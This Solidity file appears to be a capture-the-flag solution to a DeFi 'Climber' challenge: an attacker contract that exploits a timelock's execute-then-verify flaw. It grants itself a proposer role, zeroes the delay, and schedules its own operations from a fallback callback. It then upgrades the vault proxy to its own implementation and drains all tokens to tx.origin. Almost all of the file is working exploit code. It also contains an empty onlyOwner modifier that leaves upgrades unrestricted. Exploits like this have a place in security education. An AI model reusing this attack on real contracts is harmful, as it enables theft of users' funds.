// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;
import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "solady/src/utils/SafeTransferLib.sol";
import "../climber/ClimberTimelock.sol";
import "hardhat/console.sol";

contract flush is UUPSUpgradeable
{
//     // keccak256("ADMIN_ROLE");
// bytes32 constant ADMIN_ROLE = 0xa49807205ce4d355092ef5a8a18f56e8913cf4a201fbe287825b095693c21775;

// // keccak256("PROPOSER_ROLE");
// bytes32 constant PROPOSER_ROLE = 0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1;


    address owner;
    constructor() {
        _disableInitializers();
        
        owner = address(this);

        console.log("r1:");
    }

    function funcCall(address param, bytes calldata z, string calldata r1) public 
    {
        (bool success, ) = param.call(z);

        if(!success)
        {
            console.log(r1 ," failed");
        }
        else
        {
            console.log(r1 ," succeeded");
        }
    }

    ClimberTimelock timelockS;
    uint256[] values = new uint256[](3);
    address[] target = new address[](3);
    bytes[] data   = new bytes[](3); 

    function attack(ClimberTimelock timelock) public
    {
        timelockS = timelock;
        // function execute(address[] calldata target,
        // uint256[] calldata values,
        // bytes[] calldata dataElements,
        // bytes32 salt)
        console.log("r2:");

        /*
        step 1 : grant PROPOSER_ROLE to msg.sender
        step 2 : update delay to 0
        step 3 : call msg.sender
        step 4 : from fallback of msg.sender schedule step 1,2,3
        
        from msg.sender,
        step 1 : schedule update
        step 2 : execute update

        */

        

        //call target to timelock, grant proposer access to owner
        bytes memory grant = abi.encodeWithSignature("grantRole(bytes32,address)",
                           PROPOSER_ROLE,
                           owner
                           );
        values[0] = 0; target[0] = address(timelock); data[0] = grant;

        //update delay
        bytes memory updateDelay = abi.encodeWithSignature("updateDelay(uint64)",
                           0
                           );
        values[1] = 0; target[1] = address(timelock); data[1] = updateDelay;

        //call msg.sender
        values[2] = 0; target[2] = owner; data[2] = "";

        // function execute
        //(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt)

        timelock.execute(
                    target,
                    values,
                    data,
                    ""
        );

    }

    function finishIt(address vault, address token, address player) public 
    {
        data[0] = abi.encodeWithSignature("upgradeTo(address)", address(this));
        target[0] = vault;
        values[0] = 0;

        data[1] = abi.encodeWithSignature("flushIt(address,address)",
                    token,
                    tx.origin);
        target[1] = vault;
        values[1] = 0;

        require(tx.origin == player);
        console.log("length of array is ", data.length, target.length, values.length);

        data.pop();
        target.pop();
        values.pop();

        timelockS.schedule(target, values, data, "");
        timelockS.execute(target, values, data, "");

    }

    fallback() external 
    {
        //check role 
        bool hasRole = timelockS.hasRole(PROPOSER_ROLE, owner);
        console.log("proposer role ", hasRole);

        //check delay
        uint256 res =  uint256(timelockS.delay());
        console.log("Delay is ", res);

        //schedule
        timelockS.schedule(
                    target,
                    values,
                    data,
                    ""
        );
    }


    function flushIt(address token, address recipient) public 
    {
         console.log("Called here ");
        SafeTransferLib.safeTransfer(token, recipient, IERC20(token).balanceOf(address(this)));
    }

    modifier onlyOwner()
    {
        _;
    }

    function _authorizeUpgrade(address newImplementation) internal override onlyOwner {}
}